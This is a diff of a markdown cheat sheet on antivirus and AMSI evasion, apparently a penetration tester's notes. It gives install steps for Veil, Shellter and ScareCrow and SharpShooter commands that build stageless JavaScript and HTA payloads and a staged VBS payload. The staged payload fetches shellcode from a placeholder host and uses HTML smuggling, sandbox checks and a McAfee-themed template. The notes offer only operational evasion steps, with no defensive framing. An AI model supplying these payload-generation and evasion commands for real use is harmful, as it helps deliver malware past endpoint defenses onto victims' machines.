@@ -1,29 +1,71 @@
-# AV Evasion   
+# AV Bypass
 ## Notes 
 2 primary types:   
 
 on disk: file saved on target then executed 
 in memory: preferred for evasion, import script into memory and then executed.  
 
-Windows AMSI (Anti Malware Scan Interface): evals commands at runtime, scans scripts as they are imported into memory, makes evasion harder. VBA, Powershell, JavaScript. 
+Windows AMSI (Anti Malware Scan Interface): evaluates commands at runtime, scans scripts as they are imported into memory, makes evasion harder. VBA, Powershell, JavaScript. 
  AV agnostic: API any anti-virus product can use. "Identify fileless threats - at runtime most of obfuscation is removed" defeat: obfuscate code. 
 
 
 ## Tools     
-Testing: [Windows 10 developer iso](https://developer.microsoft.com/en-us/windows/downloads/virtual-machines/)  
-[Other Windows iso files](https://the-eye.eu/public/) 
 
-[Invoke-Obfuscation powershell script](https://github.com/danielbohannon/Invoke-Obfuscation)  
-[Invoke-bfuscation Usage Guide](https://www.danielbohannon.com/blog-1/2017/12/2/the-invoke-obfuscation-usage-guide)  
-https://github.com/tokyoneon/Chimera ( bypassing AMSI and signature based detection )   
-https://github.com/persianhydra/Xeexe-TopAntivirusEvasion   
-https://github.com/BC-SECURITY/Empire/blob/master/empire/server/common/bypasses.py  
+### Veil Framework:
 
-[Veil](https://github.com/Veil-Framework/Veil) 
-[Shellter](https://www.shellterproject.com/download/)  
-[Donut](https://github.com/TheWover/donut) 
-[Vulcan](https://github.com/praetorian-code/vulcan) 
-[Scarecrow](https://github.com/optiv/ScareCrow)  
+Install on Kali: 
+- apt install veil
+- /usr/share/veil/config/setup.sh --force --silent
+
+Reference: https://github.com/Veil-Framework/Veil
+
+### Shellter
+
+Source: https://www.shellterproject.com/download/
+
+    apt install shellter
+
+
+### Sharpshooter
+
+Javascript Payload Stageless: 
+
+    SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3
+
+Stageless HTA Payload: 
+
+    SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee
+
+Staged VBS:
+
+    SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4
+
+Reference: https://github.com/mdsecactivebreach/SharpShooter
+
+## Donut: 
+
+Source: https://github.com/TheWover/donut
+
+## Vulcan
+
+Source: https://github.com/praetorian-code/vulcan
+
+
+## Scarecrow
+
+Source: https://github.com/optiv/ScareCrow
+
+In Kali: 
+
+    sudo apt install golang
+
+    go get github.com/fatih/color
+    go get github.com/yeka/zip
+    go get github.com/josephspurrier/goversioninfo
+
+    go build ScareCrow.go
+
+    ./ScareCrow
 
 ## Sharpshooter
 [SharpShooter](https://github.com/mdsecactivebreach/SharpShooter)   
